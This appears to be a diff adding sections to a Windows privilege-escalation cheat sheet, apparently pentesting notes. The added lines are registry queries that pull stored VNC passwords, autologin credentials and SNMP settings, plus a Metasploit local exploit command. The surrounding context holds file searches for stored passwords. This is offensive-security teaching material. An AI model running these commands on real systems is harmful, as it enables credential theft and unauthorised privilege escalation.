@@ -165,6 +165,7 @@ findstr /si pass *.txt | *.xml | *.ini
 
 Thse are common files to find them in. They might be base64-encoded. So look out for that. 
 
+**In files**
 ```
 c:\sysprep.inf
 c:\sysprep\sysprep.xml
@@ -175,6 +176,20 @@ c:\unattend.xml
 dir c:\*vnc.ini /s /b
 dir c:\*ultravnc.ini /s /b 
 dir c:\ /s /b | findstr /si *vnc.ini
+```
+
+**In registry**
+```
+# VNC
+reg query "HKCU\Software\ORL\WinVNC3\Password"
+
+# Windows autologin
+reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
+
+# SNMP Paramters
+ reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"
+
+
 ```
 
 ### Kernel exploits
@@ -209,6 +224,10 @@ We then compile it with out cross-compiler, if you are on linux, like this:
 i686-w64-mingw32-gcc windows-exp.c -lws2_32 -o exp.exe
 ```
 
+**Using metasploit**
+```
+use exploit/windows/local/service_permissions
+```
 
 ### Unquoted Service Paths
 
